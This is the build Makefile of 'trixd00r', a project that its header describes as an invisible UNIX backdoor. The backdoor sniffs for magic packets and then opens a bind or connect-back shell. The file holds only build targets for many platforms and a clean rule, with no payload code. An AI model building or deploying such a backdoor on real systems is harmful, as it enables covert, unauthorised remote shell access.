################################################################################
#                 ____                     _ __                                #
#      ___  __ __/ / /__ ___ ______ ______(_) /___ __                          #
#     / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          #
#    /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           #
#                                             /___/ nullsecurity team          #
#                                                                              #
# trixd00r - Advanced and invisible TCP/IP based userland backdoor             #
#                                                                              #
# FILE                                                                         #
# Makefile                                                                     #
#                                                                              #
# DATE                                                                         #
# 02/10/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# trixd00r is an advanced and invisible userland backdoor based on TCP/IP for  #
# UNIX systems. It consists of a server and a client. The Server sits and      #
# waits for magic packets using a sniffer (pcap). If a magic packet arrives,   #
# it will bind a shell over TCP or UDP on the given port or connecting back to #
# the client again over TCP or UDP. The client is used to send magic packets   #
# to trigger the server and get a shell.                                       #
#                                                                              #
# COPYRIGHT                                                                    #
# Read docs/COPYING.                                                           #
#                                                                              #
# AUTHOR                                                                       #
# noptrix - http://www.nullsecurity.net/                                       #
#                                                                              #
################################################################################

.EXPORT_ALL_VARIABLES:
	@echo "[-] ERROR: you need GNU make!"

RM = rm -rf
MAKE = gmake

LDFLAGS_LINBSD="-lpcap"
LDFLAGS_FREEBSD="-lpcap"
LDFLAGS_NETBSD="-lpcap"
LDFLAGS_OPENBSD="-lpcap"
LDFLAGS_MACOS="-lpcap"
LDFLAGS_SOLARIS="-lsocket -lnsl -lpcap"
LDFLAGS_AIX="-lpcap"
LDFLAGS_HPUX="-lpcap"
LDFLGAS_IRIX="-lpcap"

default:
	@echo "+-----------------------------------------+"
	@echo "| trixd00r - http://www.nullsecurity.net/ |"
	@echo "+-----------------------------------------+"
	@echo
	@echo "[-] ERROR: type one of the following:"
	@echo
	@echo "[+] make linux       - build for Linux"
	@echo "[+] make freebsd     - build for FreeBSD"
	@echo "[+] make netbsd      - build for NetBSD"
	@echo "[+] make openbsd     - build for OpenBSD"
	@echo "[+] make solaris     - build for (Open)Solaris, OpenIndiana"
	@echo "[+] make aix         - build for AIX"
	@echo "[+] make hpux        - build for HP-UX"
	@echo "[+] make irix        - build for IRIX"
	@echo "[+] make clean       - clean all"

linux:
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_LINBSD}
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_LINBSD}

freebsd:
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_FREEBSD}
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_FREEBSD}

netbsd:
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_NETBSD}
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_NETBSD}

openbsd:
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_OPENBSD}
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_OPENBSD}

macos:
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_MACOS}
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_MACOS}

solaris:
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_SOLARIS}
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_SOLARIS}

aix:
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_AIX}
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_AIX}

hpux:
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_HPUX}
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_HPUX}

irix:
	$(MAKE) -f client/Makefile LDFLAGS=${LDFLAGS_IRIX}
	$(MAKE) -f server/Makefile LDFLAGS=${LDFLAGS_IRIX}

clean:
	$(RM) trixd00r trixd00rd server/src/*.o client/src/*.o *.o *.core core

# EOF
